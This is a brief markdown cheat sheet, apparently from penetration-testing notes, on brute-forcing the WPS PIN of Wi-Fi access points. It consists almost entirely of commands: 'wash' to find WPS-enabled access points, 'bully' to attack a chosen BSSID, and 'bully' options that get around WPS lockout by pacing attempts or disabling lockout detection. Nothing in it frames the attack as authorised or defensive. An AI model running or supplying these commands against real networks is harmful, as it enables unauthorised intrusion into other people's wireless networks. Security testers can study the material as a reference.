# Brute-forcing

Make sure the wireless interface is on monitor mode

Discover APs that supports WPS

```sh
sudo wash -i wlan0mon
```

Start attack

```sh
sudo bully -b <bssid> wlan0mon
```

Bypass WPS Lockdown

```sh
sudo bully -b <bssid> -1 <seconds> -2 <seconds> wlan0mon

sudo bully -b <bssid> -L wlan0mon # disable lockout dection (not recommended)
```

